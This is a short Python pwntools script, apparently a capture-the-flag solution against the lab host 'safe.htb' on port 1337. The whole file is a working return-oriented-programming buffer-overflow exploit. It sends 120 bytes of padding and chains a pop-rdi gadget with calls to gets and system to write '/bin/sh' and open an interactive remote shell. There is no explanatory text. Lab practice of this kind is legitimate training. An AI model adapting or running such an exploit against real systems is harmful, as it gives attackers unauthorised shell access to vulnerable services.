#!/usr/bin/python3
from pwn import remote, p64

shell = remote("safe.htb", 1337)

offset = 120
junk = b"A" * offset

bin_sh = b"/bin/sh\x00"

pop_rdi = p64(0x000000000040120b)
writable = p64(0x00404038)
plt_gets = p64(0x0000000000401060)
plt_system = p64(0x0000000000401040)

payload =  b""
payload += junk
payload += pop_rdi + writable
payload += plt_gets
payload += pop_rdi + writable
payload += plt_system

shell.recvline()
shell.sendline(payload)
shell.sendline(bin_sh)
shell.interactive()
